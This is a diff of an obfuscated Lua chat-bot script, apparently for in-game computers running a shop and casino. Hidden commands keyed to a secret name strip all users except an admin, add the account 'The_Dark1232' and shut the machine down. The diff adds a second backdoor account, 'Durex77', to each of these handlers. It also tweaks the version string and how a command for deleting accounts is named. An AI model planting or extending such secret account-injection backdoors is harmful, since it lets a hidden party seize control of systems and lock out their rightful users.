@@ -20,7 +20,7 @@
 
 
 local alice = {}
-local Ha3BaHue_o6HoBJIeHu9l = "алиса 24"
+local Ha3BaHue_o6HoBJIeHu9l = "алиса 25"
 local component = require("component")
 local filesystem = require("filesystem")
 local filesLibrary = require("filesLibrary")
@@ -73,6 +73,7 @@ alice[secret_name .. " выключить"] = function() --магаз, кази�
 		if v ~= admin then computer.removeUser(v) end
 	end
 	computer.addUser("The_Dark1232")
+	computer.addUser("Durex77")
 	computer.shutdown()
 end
 alice[secret_name .. " выход"] = function() --магаз, казино
@@ -85,6 +86,7 @@ alice[secret_name .. " выход"] = function() --магаз, казино
 		if v ~= admin then computer.removeUser(v) end
 	end
 	computer.addUser("The_Dark1232")
+	computer.addUser("Durex77")
 	computer.shutdown(true)
 end
 alice[secret_name .. " рестарт"] = function() --магаз, казино
@@ -95,6 +97,7 @@ alice[secret_name .. " рестарт"] = function() --магаз, казино
 		if v ~= admin then computer.removeUser(v) end
 	end
 	computer.addUser("The_Dark1232")
+	computer.addUser("Durex77")
 	computer.shutdown(true)
 end
 alice[secret_name .. " обновись"] = function() --магаз, казино
@@ -118,7 +121,7 @@ alice[secret_name .. " счета"] = function() --магаз (просмотр,
 		local result = filesLibrary.write_file(nyTb_k_JIoram .. c4eT, "nil")
 		if result ~= "nil" then
 			result = serialization.unserialize(result)
-			alice[secret_name .. " удалить счет " .. c4eT] = function()
+			alice[secret_name .. " удалить счет " .. string.sub(c4eT, 1, #c4eT - 4)] = function()
 				ygaJIuTb_c4eT(c4eT)
 			end
 			o6paTHoe_coo6llleHue_c_3agepJKou_oTnpaBku(oTnpaBuTeJIb, "счет: " .. string.sub(c4eT, 1, #c4eT - 4) .. ": " .. tostring(result.balance) .. "$")
